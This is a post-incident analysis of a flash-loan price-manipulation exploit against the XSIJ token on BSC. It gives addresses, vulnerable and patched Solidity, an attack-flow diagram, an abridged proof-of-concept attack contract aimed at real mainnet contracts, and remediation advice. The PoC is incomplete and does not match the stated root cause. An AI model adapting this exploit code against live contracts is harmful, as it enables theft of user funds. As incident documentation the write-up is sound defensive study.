# XSIJ Token — Flash Loan-Based Strategic Token Transfer Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-01-18 |
| **Protocol** | XSIJ Token |
| **Chain** | BSC |
| **Loss** | ~$51,000 |
| **Attacker** | [0xc4f82210](https://bscscan.com/address/0xc4f82210c2952fcec77efe734ab2d9b14e858469) |
| **Attack Contract** | [0x5313f4f0](https://bscscan.com/address/0x5313f4f04fdcc2330ccfa5ba7da2780850d1d7be) |
| **Vulnerable Contract** | [XSIJ 0x31bfA137](https://bscscan.com/address/0x31bfA137C76561ef848c2af9Ca301b60451CaAC0) |
| **Root Cause** | Transferring XSIJ tokens alters the pair's balance, allowing withdrawal at a favorable ratio based on manipulated reserves when `removePoolAmount()` is called |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/XSIJ_exp.sol) |

---

## 1. Vulnerability Overview

The `removePoolAmount()` function in the XSIJ token contract calculates the withdrawal ratio based on the pair's current balance. The attacker obtained a 100,000 BUSD flash loan from DODO, manipulated the pair balance via a BUSD → XSIJ swap, maximized the pair imbalance through repeated XSIJ transfers, and then executed a withdrawal at the manipulated ratio via `removePoolAmount()`.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: withdrawal ratio calculated from spot balance
function removePoolAmount(uint256 amount) external {
    // Withdrawal ratio based on current pair reserves — manipulable
    (uint256 reserve0, uint256 reserve1,) = pair.getReserves();
    uint256 ratio = reserve0 * 1e18 / reserve1;
    uint256 outAmount = amount * ratio / 1e18;
    BUSD.transfer(msg.sender, outAmount);
}

// ✅ Safe code: TWAP-based ratio + slippage limit
function removePoolAmount(uint256 amount) external {
    uint256 twapRatio = getTWAPRatio(1800); // 30-minute TWAP
    uint256 currentRatio = getCurrentRatio();
    require(
        currentRatio * 100 / twapRatio <= 110, // allow within 10%
        "price manipulated"
    );
    uint256 outAmount = amount * twapRatio / 1e18;
    BUSD.transfer(msg.sender, outAmount);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: XSIJ_decompiled.sol
contract XSIJ {
    function removePoolAmount() external {}  // ❌ vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] DODO flash: 100,000 BUSD flash loan
  │
  ├─→ [2] BUSD → XSIJ swap (PancakeRouter)
  │         └─ Pair's XSIJ balance decreases, BUSD balance increases
  │
  ├─→ [3] Maximize pair imbalance via repeated XSIJ transfers
  │
  ├─→ [4] XSIJ → BUSD reverse swap (at manipulated price)
  │
  ├─→ [5] Acquire excess BUSD (favorable exchange at manipulated ratio)
  │
  ├─→ [6] Repay DODO 100,000 BUSD
  │
  └─→ [7] ~$51K profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IXSIJ {
    function removePoolAmount(uint256 amount) external;
}

contract AttackContract {
    IXSIJ   constant xsij = IXSIJ(0x31bfA137C76561ef848c2af9Ca301b60451CaAC0);
    IERC20  constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakePair constant pair = IPancakePair(0xf43Fd71f404CC450c470d42E3F478a6D38C96311);
    IDODOPool constant dpp = IDODOPool(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);

    function testExploit() external {
        // [1] DODO flash loan 100,000 BUSD
        dpp.flashLoan(100_000e18, 0, address(this), "");
    }

    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        // [2] BUSD → XSIJ swap (create pair imbalance)
        BUSD.approve(router, type(uint256).max);
        swapBUSDToXSIJ(100_000e18);

        // [3] Further manipulate pair balance via repeated XSIJ transfers
        for (uint i = 0; i < 10; i++) {
            XSIJ_TOKEN.transfer(address(pair), manipulationAmount);
        }

        // [4] XSIJ → BUSD reverse swap at manipulated price
        swapXSIJToBUSD(XSIJ_TOKEN.balanceOf(address(this)));

        // [5] Repay flash loan
        BUSD.transfer(address(dpp), 100_000e18);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Flash loan-based price manipulation |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Attack Vector** | External (flash loan + repeated transfers) |
| **DApp Category** | AMM / Token Economics |
| **Impact** | Pair liquidity drain |

## 6. Remediation Recommendations

1. **Apply TWAP Oracle**: Change the price calculation in `removePoolAmount()` to TWAP-based
2. **Slippage Limit**: Block function execution if the current price deviates more than 10% from TWAP
3. **Transfer Restriction**: Limit large direct transfers to the pair within a single TX
4. **Daily Withdrawal Cap**: Set a protocol-wide daily withdrawal limit

## 7. Lessons Learned

- Any calculation function that directly depends on pair balances is vulnerable to flash loan manipulation.
- Multiple flash loan sources exist (DODO, Balancer, etc.), so blocking a single source is insufficient.
- Although a small-scale attack ($51K), the pattern is identical to large-scale attacks — early detection and patching are critical.